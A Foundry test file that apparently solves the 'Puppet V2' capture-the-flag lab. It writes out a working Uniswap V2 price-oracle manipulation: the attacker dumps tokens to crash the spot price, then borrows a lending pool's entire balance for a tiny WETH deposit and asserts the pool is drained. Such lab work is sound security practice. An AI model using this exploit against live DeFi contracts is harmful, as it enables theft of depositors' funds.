pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {ERC20Mint} from "../../src/exchange/ERC20Mint.sol";
import {WETH9} from "../../src/puppet-v2/WETH9.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/puppetv2pool.sol";
import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";

import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";


contract PuppetV2Test is Test {
	address constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
	address constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

	uint256 constant POOL_INITIAL_BALANCE = 1_000_000 ether;
	uint256 constant UNISWAP_TOKEN_RESERVE = 100 ether;
	uint256 constant UNISWAP_WETH_RESERVE = 10 ether;
	uint256 constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000 ether;
	uint256 constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;


	ERC20Mint public token;
	WETH9 public weth;
	PuppetV2Pool public pool;

	IUniswapV2Factory public uniswapFactory;
	IUniswapV2Router02 public uniswapRouter;
	IUniswapV2Pair public uniswapPair;

	address public deployer;
	address public attacker;

	function setUp() public {
		deployer = address(this);
		attacker = makeAddr("attacker");

		token = new ERC20Mint("Our Token", "CAP");
		weth = new WETH9();

		console.log(" Token:", address(token));
		console.log(" WETH:", address(weth));

		uniswapFactory = IUniswapV2Factory(UNISWAP_FACTORY);
		uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER);

		console.log(" Setting up Uniswap pair...");

		_setupUniswap();

		pool = new PuppetV2Pool(
			address(weth),
			address(token),
			address(uniswapPair),
			address(uniswapFactory)
		);
		console.log(" Pool:", address(pool));

		token.mint(address(pool), POOL_INITIAL_BALANCE);

		token.mint(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
		console.log("attacker balance:", token.balanceOf(attacker));
		vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);
		
		_verifySetup();
	}

	function _setupUniswap() internal {
		uniswapFactory.createPair(address(weth), address(token));
		uniswapPair = IUniswapV2Pair(
			uniswapFactory.getPair(address(weth), address(token))
		);

		console.log(" Pair Created:", address(uniswapPair));

		address calculatedPair = UniswapV2Library.pairFor(
			address(uniswapFactory),
			address(weth),
			address(token)
		);
		require(address(uniswapPair) == calculatedPair, "Pair address mismatch");

		token.mint(deployer, UNISWAP_TOKEN_RESERVE);
		vm.deal(deployer,UNISWAP_WETH_RESERVE);
		weth.deposit{value: UNISWAP_WETH_RESERVE}();

		token.approve(address(uniswapRouter), type(uint256).max);
		weth.approve(address(uniswapRouter), type(uint256).max);

		uniswapRouter.addLiquidity(
			address(token),
			address(weth),
			UNISWAP_TOKEN_RESERVE,
			UNISWAP_WETH_RESERVE,
			UNISWAP_TOKEN_RESERVE,
			UNISWAP_WETH_RESERVE,
			deployer,
			block.timestamp
		);

		(uint112 reserve0, uint112 reserve1,) = uniswapPair.getReserves();
	}


	function _verifySetup() internal view {
		uint256 poolBalance = token.balanceOf(address(pool));
		require(poolBalance == POOL_INITIAL_BALANCE, "Pool balance incorrect");

		uint256 attackerTokens = token.balanceOf(address(attacker));
		require(attackerTokens == ATTACKER_INITIAL_TOKEN_BALANCE, "Attacker balance incorrect");

		uint256 attackerEth = attacker.balance;
		require(attackerEth == ATTACKER_INITIAL_ETH_BALANCE, "Attacker ETH balance incorrect");

		(uint256 reserveWETH, uint256 reserveToken) = UniswapV2Library.getReserves(
			address(uniswapFactory),
			address(weth),
			address(token)
		);

		uint256 depositRequired = pool.calculateDepositOfWETHRequired(1000 ether);
		console.log("To borrow 1000 tokens, need" , depositRequired/ 1e18, "WETH");

		console.log("Setup Complete");
	}

	function testInitalState() public view {
		assertEq(token.balanceOf(address(pool)), POOL_INITIAL_BALANCE);
        	assertEq(token.balanceOf(attacker), ATTACKER_INITIAL_TOKEN_BALANCE);
        	assertEq(attacker.balance, ATTACKER_INITIAL_ETH_BALANCE);
	}

	function testExploit() public {
		vm.startPrank(attacker);

		uint256 poolBalance = token.balanceOf(address(pool));
		uint256 depositBefore = pool.calculateDepositOfWETHRequired(poolBalance);

		console.log("BEFORE price manipulation:");

		console.log("Dumping tokens to crash price");
		uint256 attackerTokenBalance = token.balanceOf(attacker);
		token.approve(address(uniswapRouter), attackerTokenBalance);

		address[] memory path = new address[](2);
		path[0] = address(token);
		path[1] = address(weth);

		console.log(" Swapping" , attackerTokenBalance / 1e18, "tokens for WETH");

		uint256[] memory amounts = uniswapRouter.swapExactTokensForTokens(
			attackerTokenBalance,
			1,
			path,
			attacker,
			block.timestamp
		);

		console.log(" Received" , amounts[1] / 1e18, "WETH");

		(uint256 reserveWETH, uint256 reserveToken) = UniswapV2Library.getReserves(
			address(uniswapFactory),
			address(weth),
			address(token)
		);

		console.log("New Reserves:");
		console.log("-WETH:", reserveWETH / 1e18);
		console.log("-Tokens:", reserveToken / 1e18);

		uint256 depositAfter = pool.calculateDepositOfWETHRequired(poolBalance);

		console.log("After price manipulation:");
		console.log(" To borrow", poolBalance / 1e18, "tokens");
		console.log(" Only need", depositAfter / 1e18, "WETH");

		uint256 ethBalance = attacker.balance;
		weth.deposit{value: ethBalance}();

		uint256 totalWeth = weth.balanceOf(attacker);

		console.log(" Total WETH:", totalWeth / 1e18, "ETH");

		require(totalWeth >= depositAfter, "Not enough WETH");

		console.log("Drain the pool");
		weth.approve(address(pool), depositAfter);
		pool.borrow(poolBalance);

		console.log(" Borrowed", poolBalance / 1e18, "tokens");

		vm.stopPrank();

		uint256 poolFinalBalance = token.balanceOf(address(pool));
        	uint256 attackerFinalBalance = token.balanceOf(attacker);
		
		console.log("Pool final balance:", poolFinalBalance / 1e18);
		console.log("Attacker final balance:", attackerFinalBalance / 1e18);

		assertEq(poolFinalBalance, 0, "Pool is drained");
		assertGt(attackerFinalBalance, POOL_INITIAL_BALANCE * 99 / 100, "Attacker has most tokens");
	}
}
